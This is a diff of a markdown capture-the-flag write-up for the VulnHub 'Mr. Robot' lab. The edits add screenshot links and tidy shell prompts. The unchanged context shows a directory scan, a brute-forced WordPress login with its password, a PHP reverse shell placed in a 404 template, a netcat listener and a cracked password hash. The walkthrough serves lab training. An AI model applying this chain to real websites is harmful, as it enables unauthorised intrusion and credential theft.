@@ -43,7 +43,7 @@ HOP RTT     ADDRESS
 Dirb Scan Results
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:~/vulnhub/mr.robot# dirb http://192.168.56.104
+root@setrus:~# dirb http://192.168.56.104
 
 -----------------
 DIRB v2.22    
@@ -98,7 +98,7 @@ key-1-of-3.txt
 
 Going to http://www.example.com/wp-login we get the information that the user is elliot.
 
-
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/mr.Robot/mr.robot1.png
 
 After brute forcing the password for elliot using dictionary “ fsocity.dic” we get the following credentials:
 
@@ -107,13 +107,14 @@ password : ER28-0652
 
 Logging into Wordpress
 
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/mr.Robot/mr.robot2.png)
 
 We try to modify a standart 404 error page and add a reverse shell instead of the code for page not found .
 
 After adding the code for the php- reverse-shell we get a reverse shell on the listenting port on kali linux .
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root@setrus:~/vulnhub/mr.robot# nc -nvlp 1234
+root@setrus:~# nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [192.168.56.101] from (UNKNOWN) [192.168.56.104] 40889
 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
@@ -124,7 +125,6 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 $ id
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
 
 
 Getting password for user robot
@@ -138,6 +138,8 @@ robot:c3fcd3d76192e4007dfb496cca67e13b
 
 
 Using Crack Station to crack the password
+
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/mr.Robot/mr.robot3.png)
 
 
 Getting user robot
